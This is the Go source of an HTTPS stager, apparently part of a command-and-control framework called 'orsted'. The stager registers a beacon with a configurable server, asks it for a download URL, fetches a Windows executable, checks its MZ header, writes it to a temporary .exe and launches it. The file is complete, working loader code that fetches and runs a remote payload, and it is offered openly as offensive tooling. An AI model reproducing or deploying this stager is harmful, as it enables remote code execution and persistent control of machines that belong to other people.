//go:build stager_https
// +build stager_https

package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"time"

	"orsted/beacon/core"
	"orsted/beacon/peers"
	"orsted/beacon/utils"
	"orsted/profiles"
)

var (
	TargetIP          string
	TargetPort        string
	HTTPProxyType     string = "none"
	HTTPProxyURL      string = ""
	HTTPProxyUsername string = ""
	HTTPProxyPassword string = ""
)

func isPEValid(data []byte) bool {
	if len(data) < 2 {
		return false
	}
	return data[0] == 0x4D && data[1] == 0x5A
}

func downloadAgent(url string) ([]byte, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned status %d", resp.StatusCode)
	}

	var buf bytes.Buffer
	_, err = io.Copy(&buf, resp.Body)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func requestAgentDownload(hp utils.Peer, beaconID string) string {
	tasks, err := core.RetreiveTask(hp, beaconID)
	if err != nil {
		utils.Print("Error retrieving tasks:", err.Error())
		return ""
	}

	if tasks == nil || len(tasks.Tasks) == 0 {
		return ""
	}

	for _, task := range tasks.Tasks {
		if task.State == "agent_download_url" {
			return task.Command
		}
	}

	return ""
}

func executeAgent(data []byte) error {
	tmpFile, err := os.CreateTemp("", "agent_*.exe")
	if err != nil {
		return err
	}
	defer os.Remove(tmpFile.Name())

	_, err = tmpFile.Write(data)
	if err != nil {
		tmpFile.Close()
		return err
	}
	tmpFile.Close()

	err = os.Chmod(tmpFile.Name(), 0755)
	if err != nil {
		return err
	}

	_, err = os.StartProcess(tmpFile.Name(), []string{tmpFile.Name()}, &os.ProcAttr{
		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
	})

	if err != nil {
		return err
	}

	return nil
}

func stagerHTTPS() {
	_ = profiles.InitialiseProfile()

	profiles.Config.Domain = TargetIP
	profiles.Config.Port = TargetPort
	if HTTPProxyType == "http" || HTTPProxyType == "https" {
		profiles.Config.HTTPProxyType = HTTPProxyType
		profiles.Config.HTTPProxyUrl = HTTPProxyURL
		profiles.Config.HTTPProxyUsername = HTTPProxyUsername
		profiles.Config.HTTPProxyPassword = HTTPProxyPassword
	}

	hp, err := peers.NewHTTPSPeer(profiles.Config)
	if err != nil {
		utils.Print("Error creating HTTPS peer:", err.Error())
		return
	}
	utils.ParentPeer = hp
	utils.Print("Starting HTTPS Stager")

	beaconID, err := core.RegisterBeacon(hp)
	for err != nil {
		utils.Print("Error while registering stager:", err.Error())
		time.Sleep(2 * time.Second)
		beaconID, err = core.RegisterBeacon(hp)
	}

	utils.Print("Stager registered with ID:", beaconID)
	utils.CurrentBeaconId = beaconID

	downloadURL := ""
	for attempt := 0; attempt < 5; attempt++ {
		downloadURL = requestAgentDownload(hp, beaconID)
		if downloadURL != "" {
			break
		}
		time.Sleep(2 * time.Second)
	}

	if downloadURL == "" {
		utils.Print("Failed to retrieve agent download URL")
		return
	}

	utils.Print("Download URL received:", downloadURL)

	var agentBinary []byte
	for attempt := 1; attempt <= 3; attempt++ {
		agentBinary, err = downloadAgent(downloadURL)
		if err == nil && len(agentBinary) > 0 {
			break
		}
		if attempt < 3 {
			wait := time.Duration(1<<uint(attempt-1)) * 2 * time.Second
			utils.Print("Download failed (attempt", attempt, "), retrying in", wait.Seconds(), "seconds:", err)
			time.Sleep(wait)
		}
	}

	if len(agentBinary) == 0 {
		utils.Print("Failed to download agent after retries")
		return
	}

	utils.Print("Agent downloaded successfully, size:", len(agentBinary))

	if !isPEValid(agentBinary) {
		utils.Print("Downloaded agent is not a valid PE binary")
		return
	}

	utils.Print("PE validation passed, executing agent")

	err = executeAgent(agentBinary)
	if err != nil {
		utils.Print("Failed to execute agent:", err.Error())
		return
	}

	utils.Print("Agent executed successfully, stager exiting")
}

func main() {
	stagerHTTPS()
}
